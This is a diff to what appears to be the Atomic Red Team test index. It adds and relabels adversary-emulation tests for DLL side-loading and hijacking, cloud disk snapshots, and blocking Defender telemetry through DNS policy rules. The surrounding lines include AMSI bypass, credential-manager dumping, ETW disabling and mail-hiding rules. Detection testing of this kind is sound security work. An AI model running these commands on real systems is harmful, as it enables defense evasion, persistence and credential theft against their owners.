@@ -4769,76 +4769,6 @@ dependencies.0.prereq_command: if [ -x ""$(command -v emacs)"" ]; then echo ""em
 dependencies.0.get_prereq_command: which apt && apt update && apt install -y emacs || which pkg && pkg update && pkg install -y emacs || which brew && brew update && brew install --quiet emacs
 
 ",
-T1574.002,Hijack Execution Flow: DLL Side-Loading,DLL Side-Loading using the Notepad++ GUP.exe binary,65526037-7079-44a9-bda1-2cb624838040,"GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
-Upon execution, calc.exe will be opened.
-",windows,,,"""#{gup_executable}""
-",command_prompt,,,"taskkill /F /IM #{process_name} >nul 2>&1
-",powershell,"dependencies.0.description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
-
-dependencies.0.prereq_command: if (Test-Path ""#{gup_executable}"") {exit 0} else {exit 1}
-
-dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{gup_executable}"") -ErrorAction ignore | Out-Null
-Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true"" -OutFile ""#{gup_executable}""
-
-","input_arguments.process_name.description: Name of the created process
-
-input_arguments.process_name.type: string
-
-input_arguments.process_name.default: calculator.exe
-
-input_arguments.gup_executable.description: GUP is an open source signed binary used by Notepad++ for software updates
-
-input_arguments.gup_executable.type: path
-
-input_arguments.gup_executable.default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
-
-"
-T1574.002,Hijack Execution Flow: DLL Side-Loading,DLL Side-Loading using the dotnet startup hook environment variable,d322cdd7-7d60-46e3-9111-648848da7c02,"Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
-",windows,,,"set DOTNET_STARTUP_HOOKS=""#{preloader_dll}""
-dotnet -h > nul
-echo.
-",command_prompt,,,"taskkill /F /IM #{process_name} >nul 2>&1
-",powershell,"dependencies.0.description: .Net SDK must be installed
-
-dependencies.0.prereq_command: if (Test-Path ""C:\Program Files\dotnet\dotnet.exe"") {exit 0} else {exit 1}
-
-dependencies.0.get_prereq_command: winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
-echo.
-
-dependencies.1.description: preloader must exist
-
-dependencies.1.prereq_command: if (Test-Path ""#{preloader_dll}"") {exit 0} else {exit 1}
-
-dependencies.1.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true"" -OutFile ""#{preloader_dll}""
-
-","input_arguments.process_name.description: Name of the created process
-
-input_arguments.process_name.type: string
-
-input_arguments.process_name.default: calculator.exe
-
-input_arguments.preloader_dll.description: library for interfacing with the dotnet framework
-
-input_arguments.preloader_dll.type: path
-
-input_arguments.preloader_dll.default: PathToAtomicsFolder\T1574.002\bin\preloader.dll
-
-"
-T1574.002,Hijack Execution Flow: DLL Side-Loading,"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE",c095ad8e-4469-4d33-be9d-6f6d1fb21585,"Various threat actors and malware have been found side loading a masqueraded ""KeyScramblerIE.dll"" through ""KeyScrambler.exe"", which can load further executables embedded in modified KeyScramblerIE.dll file.
-",windows,,,"Write-Host 1.Downloading KeyScrambler from official website to temp directory
-Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe
-Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
-Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
-Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
-Copy-Item ""C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe"" -Destination $env:TEMP\KeyScrambler.exe
-Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
-Start-Process -FilePath $env:Temp\KeyScrambler.exe
-Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",powershell,True,,"Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted.
-
-Remove-Item -Path $env:Temp\KeyScrambler_Setup.exe
-Start-Process -FilePath ""C:\Program Files (x86)\KeyScrambler\Uninstall.exe"" -ArgumentList /S -Wait
-Remove-Item -Path $env:Temp\KeyScrambler.exe
-Write-Host 2.KeyScrambler cleanup completed successfully.",,,
 T1135,Network Share Discovery,Network Share Discovery,f94b5ad9-911c-4eff-9718-fd21899db4f7,"Network Share Discovery
 ",macos,,,"df -aH
 smbutil view -g //#{computer_name}
@@ -10246,6 +10176,117 @@ input_arguments.server_name.type: url
 input_arguments.server_name.default: https://www.example.com
 
 "
+T1578.001,Modify Cloud Compute Infrastructure: Create Snapshot,AWS - Create Snapshot from EBS Volume,a3c09662-85bb-4ea8-b15b-6dc8a844e236,"Creates an EBS snapshot in AWS using the AWS CLI.
+This simulates an adversary duplicating volume data via snapshots for persistence or exfiltration.
+",iaas:aws,,,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""Atomic Red Team Test Snapshot"" --query ""SnapshotId"" --output text
+",sh,False,,"SNAPSHOT_ID=$(aws ec2 describe-snapshots --region #{aws_region} --filters ""Name=volume-id,Values=#{aws_volume_id}"" --query ""Snapshots[0].SnapshotId"" --output text)
+if [ ""$SNAPSHOT_ID"" != ""None"" ]; then
+  aws ec2 delete-snapshot --region #{aws_region} --snapshot-id ""$SNAPSHOT_ID""
+fi
+",,"dependencies.0.description: AWS CLI must be installed.
+dependencies.0.prereq_command: if command -v aws > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.0.get_prereq_command: echo ""Install AWS CLI: https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html""
+
+dependencies.1.description: AWS CLI must be authenticated.
+dependencies.1.prereq_command: if aws sts get-caller-identity --region #{aws_region} > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.1.get_prereq_command: echo ""Configure AWS credentials with: aws configure""
+
+dependencies.2.description: EBS volume must exist.
+dependencies.2.prereq_command: if aws ec2 describe-volumes --volume-ids #{aws_volume_id} --region #{aws_region} > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.2.get_prereq_command: echo ""Ensure the volume ID exists in the target AWS account and region.""
+
+","input_arguments.aws_region.description: AWS region where the volume is located.
+
+input_arguments.aws_region.type: string
+
+input_arguments.aws_region.default: us-east-1
+
+input_arguments.aws_volume_id.description: The AWS EBS Volume ID to create a snapshot from.
+
+input_arguments.aws_volume_id.type: string
+
+input_arguments.aws_volume_id.default: vol-0123456789abcdef0
+
+"
+T1578.001,Modify Cloud Compute Infrastructure: Create Snapshot,Azure - Create Snapshot from Managed Disk,89e69b4b-3458-4ec6-b819-b3008debc1bc,"Creates a snapshot of a managed disk in Azure using the Azure CLI.
+Simulates adversary snapshotting behavior for persistence or data duplication.
+",iaas:azure,,,"az snapshot create --resource-group #{azure_resource_group} --name #{azure_snapshot_name} --source #{azure_disk_name} --location eastus
+",sh,False,,"az snapshot delete --resource-group #{azure_resource_group} --name #{azure_snapshot_name}
+",,"dependencies.0.description: Azure CLI must be installed.
+dependencies.0.prereq_command: if command -v az > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.0.get_prereq_command: echo ""Install Azure CLI: https://learn.microsoft.com/en-us/cli/azure/install-azure-cli""
+
+dependencies.1.description: Azure CLI must be authenticated.
+dependencies.1.prereq_command: if az account show > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.1.get_prereq_command: echo ""Login with: az login""
+
+dependencies.2.description: Azure disk must exist.
+dependencies.2.prereq_command: if az disk show --resource-group #{azure_resource_group} --name #{azure_disk_name} > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.2.get_prereq_command: echo ""Ensure the disk exists in the given resource group.""
+
+","input_arguments.azure_resource_group.description: The Azure resource group where the disk is located.
+
+input_arguments.azure_resource_group.type: string
+
+input_arguments.azure_resource_group.default: myResourceGroup
+
+input_arguments.azure_disk_name.description: The Azure disk name.
+
+input_arguments.azure_disk_name.type: string
+
+input_arguments.azure_disk_name.default: myDiskName
+
+input_arguments.azure_snapshot_name.description: The Azure snapshot name.
+
+input_arguments.azure_snapshot_name.type: string
+
+input_arguments.azure_snapshot_name.default: mySnapshotName
+
+"
+T1578.001,Modify Cloud Compute Infrastructure: Create Snapshot,GCP - Create Snapshot from Persistent Disk,e6fbc036-91e7-4ad3-b9cb-f7210f40dd5d,"Creates a snapshot of a persistent disk in GCP using the gcloud CLI.
+Emulates adversary behavior to gain access to volume data or replicate environment state.
+",iaas:gcp,,,"gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}
+",sh,False,,"gcloud compute snapshots delete #{gcp_snapshot_name} --quiet
+",,"dependencies.0.description: gcloud CLI must be installed.
+dependencies.0.prereq_command: if command -v gcloud > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.0.get_prereq_command: echo ""Install gcloud CLI: https://cloud.google.com/sdk/docs/install""
+
+dependencies.1.description: gcloud CLI must be authenticated.
+dependencies.1.prereq_command: if gcloud auth list --filter=status:ACTIVE --format=""value(account)"" | grep . > /dev/null; then exit 0; else exit 1; fi
+
+dependencies.1.get_prereq_command: echo ""Authenticate with: gcloud auth login""
+
+dependencies.2.description: GCP disk must exist.
+dependencies.2.prereq_command: if gcloud compute disks describe #{gcp_disk_name} --zone=#{gcp_zone} > /dev/null 2>&1; then exit 0; else exit 1; fi
+
+dependencies.2.get_prereq_command: echo ""Ensure the disk exists in the specified zone.""
+
+","input_arguments.gcp_disk_name.description: The Google Cloud disk name.
+
+input_arguments.gcp_disk_name.type: string
+
+input_arguments.gcp_disk_name.default: myDiskName
+
+input_arguments.gcp_zone.description: The Google Cloud zone where the disk is located.
+
+input_arguments.gcp_zone.type: string
+
+input_arguments.gcp_zone.default: us-central1-a
+
+input_arguments.gcp_snapshot_name.description: The Google Cloud snapshot name.
+
+input_arguments.gcp_snapshot_name.type: string
+
+input_arguments.gcp_snapshot_name.default: mySnapshotName
+
+"
 T1546.007,Event Triggered Execution: Netsh Helper DLL,Netsh Helper DLL Registration,3244697d-5a3a-4dfc-941c-550f69f91a4d,"You can register a ""helper dll"" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.
 The NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.
 
@@ -11631,7 +11672,7 @@ T1057,Process Discovery,Launch Taskmgr from cmd to View running processes,4fd353
 [Reference](https://github.com/trellix-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Conti_Ransomware.yml)
 ",windows,,,"taskmgr.exe /7
 ",command_prompt,False,,,,,
-T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,DLL Search Order Hijacking - amsi.dll,8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3,"Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
+T1574.001,Hijack Execution Flow: DLL,DLL Search Order Hijacking - amsi.dll,8549ad4b-b5df-4a2d-a3d7-2aee9e7052a3,"Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)
 https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/
 
 Upon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.
@@ -11641,7 +11682,7 @@ copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
 ",command_prompt,True,,"del %APPDATA%\updater.exe >nul 2>&1
 del %APPDATA%\amsi.dll >nul 2>&1
 ",,,
-T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,Phantom Dll Hijacking - WinAppXRT.dll,46ed938b-c617-429a-88dc-d49b5c9ffedb,".NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS
+T1574.001,Hijack Execution Flow: DLL,Phantom Dll Hijacking - WinAppXRT.dll,46ed938b-c617-429a-88dc-d49b5c9ffedb,".NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS
 Setting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\windows\system32 (or any other location accessible via PATH) will ensure the 
 WinAppXRT.dll is loaded everytime user launches an application using .NET.
 
@@ -11654,7 +11695,7 @@ reg add ""HKEY_CURRENT_USER\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""
 del %windir%\System32\WinAppXRT.dll
 del %APPDATA%\WinAppXRT.dll
 ",,,
-T1574.001,Hijack Execution Flow: DLL Search Order Hijacking,Phantom Dll Hijacking - ualapi.dll,5898902d-c5ad-479a-8545-6f5ab3cfc87f,"Re-starting the Print Spooler service leads to C:\Windows\System32\ualapi.dll being loaded
+T1574.001,Hijack Execution Flow: DLL,Phantom Dll Hijacking - ualapi.dll,5898902d-c5ad-479a-8545-6f5ab3cfc87f,"Re-starting the Print Spooler service leads to C:\Windows\System32\ualapi.dll being loaded
 A malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts
 
 Upon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart.
@@ -11666,6 +11707,76 @@ sc config Spooler start=auto
 ",command_prompt,True,,"del %windir%\System32\ualapi.dll
 del %APPDATA%\ualapi.dll
 ",,,
+T1574.001,Hijack Execution Flow: DLL,DLL Side-Loading using the Notepad++ GUP.exe binary,65526037-7079-44a9-bda1-2cb624838040,"GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
+Upon execution, calc.exe will be opened.
+",windows,,,"""#{gup_executable}""
+",command_prompt,,,"taskkill /F /IM #{process_name} >nul 2>&1
+",powershell,"dependencies.0.description: Gup.exe binary must exist on disk at specified location (#{gup_executable})
+
+dependencies.0.prereq_command: if (Test-Path ""#{gup_executable}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{gup_executable}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/GUP.exe?raw=true"" -OutFile ""#{gup_executable}""
+
+","input_arguments.process_name.description: Name of the created process
+
+input_arguments.process_name.type: string
+
+input_arguments.process_name.default: calculator.exe
+
+input_arguments.gup_executable.description: GUP is an open source signed binary used by Notepad++ for software updates
+
+input_arguments.gup_executable.type: path
+
+input_arguments.gup_executable.default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
+
+"
+T1574.001,Hijack Execution Flow: DLL,DLL Side-Loading using the dotnet startup hook environment variable,d322cdd7-7d60-46e3-9111-648848da7c02,"Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
+",windows,,,"set DOTNET_STARTUP_HOOKS=""#{preloader_dll}""
+dotnet -h > nul
+echo.
+",command_prompt,,,"taskkill /F /IM #{process_name} >nul 2>&1
+",powershell,"dependencies.0.description: .Net SDK must be installed
+
+dependencies.0.prereq_command: if (Test-Path ""C:\Program Files\dotnet\dotnet.exe"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
+echo.
+
+dependencies.1.description: preloader must exist
+
+dependencies.1.prereq_command: if (Test-Path ""#{preloader_dll}"") {exit 0} else {exit 1}
+
+dependencies.1.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/preloader.dll?raw=true"" -OutFile ""#{preloader_dll}""
+
+","input_arguments.process_name.description: Name of the created process
+
+input_arguments.process_name.type: string
+
+input_arguments.process_name.default: calculator.exe
+
+input_arguments.preloader_dll.description: library for interfacing with the dotnet framework
+
+input_arguments.preloader_dll.type: path
+
+input_arguments.preloader_dll.default: PathToAtomicsFolder\T1574.002\bin\preloader.dll
+
+"
+T1574.001,Hijack Execution Flow: DLL,"DLL Search Order Hijacking,DLL Sideloading Of KeyScramblerIE.DLL Via KeyScrambler.EXE",c095ad8e-4469-4d33-be9d-6f6d1fb21585,"Various threat actors and malware have been found side loading a masqueraded ""KeyScramblerIE.dll"" through ""KeyScrambler.exe"", which can load further executables embedded in modified KeyScramblerIE.dll file.
+",windows,,,"Write-Host 1.Downloading KeyScrambler from official website to temp directory
+Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe
+Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
+Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
+Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
+Copy-Item ""C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe"" -Destination $env:TEMP\KeyScrambler.exe
+Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
+Start-Process -FilePath $env:Temp\KeyScrambler.exe
+Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker",powershell,True,,"Write-Host 1.Kindly close the popup window asking for KeyScramblerIE.dll ,so that it gets deleted.
+
+Remove-Item -Path $env:Temp\KeyScrambler_Setup.exe
+Start-Process -FilePath ""C:\Program Files (x86)\KeyScrambler\Uninstall.exe"" -ArgumentList /S -Wait
+Remove-Item -Path $env:Temp\KeyScrambler.exe
+Write-Host 2.KeyScrambler cleanup completed successfully.",,,
 T1555,Credentials from Password Stores,Extract Windows Credential Manager via VBA,234f9b7c-b53d-4f32-897b-b880a6c9ea7b,"This module will extract the credentials found within the Windows credential manager and dump
 them to $env:TEMP\windows-credentials.txt
 ",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -16479,7 +16590,7 @@ input_arguments.dll_path.default: %windir%\system32\inetsrv\defdoc.dll
 "
 T1564.008,Hide Artifacts: Email Hiding Rules,New-Inbox Rule to Hide E-mail in M365,30f7d3d1-78e2-4bf0-9efa-a175b5fce2a9,"This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.
  Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf
-",azure-ad,,,"Import-Module ExchangeOnlineManagement
+",office-365,,,"Import-Module ExchangeOnlineManagement
 $password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
 $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
 Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
@@ -20256,6 +20367,26 @@ T1562.006,Impair Defenses: Indicator Blocking,Disable .NET Event Tracing for Win
 T1562.006,Impair Defenses: Indicator Blocking,Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell,b42c1f8c-399b-47ae-8fd8-763181395fee,Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using PowerShell. In order for changes to take effect a logout might be required.,windows,,,"New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",powershell,,,Remove-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled,,,
 T1562.006,Impair Defenses: Indicator Blocking,Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd,110b4281-43fe-405f-a184-5d8eaf228ebf,Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using the reg.exe utility. In order for changes to take effect a reboot might be required.,windows,,,"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",command_prompt,True,,"REG DELETE ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" /v COMPlus_ETWEnabled /f > nul 2>&1",,,
 T1562.006,Impair Defenses: Indicator Blocking,Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell,4d61779d-be7f-425c-b560-0cafb2522911,Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using PowerShell. In order for changes to take effect a reboot might be required.,windows,,,"New-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",powershell,True,,"Remove-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"" -Name COMPlus_ETWEnabled",,,
+T1562.006,Impair Defenses: Indicator Blocking,Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table,1174b5df-2c33-490f-8854-f5eb80c907ca,"Adversaries are redirecting DNS queries to an incorrect or malicious DNS server IP, thereby blocking legitimate communications and potentially compromising the security infrastructure. This atomic test aims to respond with 127.0.0.1 when a DNS query is made for endpoint.security.microsoft.com.",windows,,,"Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
+Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
+Clear-DnsClientCache",powershell,True,,"try {
+    # Get all current NRPT rules
+        $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq 'Silenced by Name Resolution Policy Table' }
+    
+    # Remove each NRPT rule
+        foreach ($rule in $DnsClientNrptRules) {
+            Remove-DnsClientNrptRule -Name $rule.Name -Force
+        }
+    
+    # Clear DNS client cache
+    Clear-DnsClientCache
+    Write-Host ""All NRPT rules have been removed and the DNS cache has been cleared.""
+}
+
+catch {
+    Write-Host ""An error occurred: $_""
+}
+Clear-DnsClientCache",,,
 T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Exfiltration Over Alternative Protocol - HTTP,1d1abbd6-a3d3-4b2e-bef5-c59293f46eff,"A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.
 
 Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
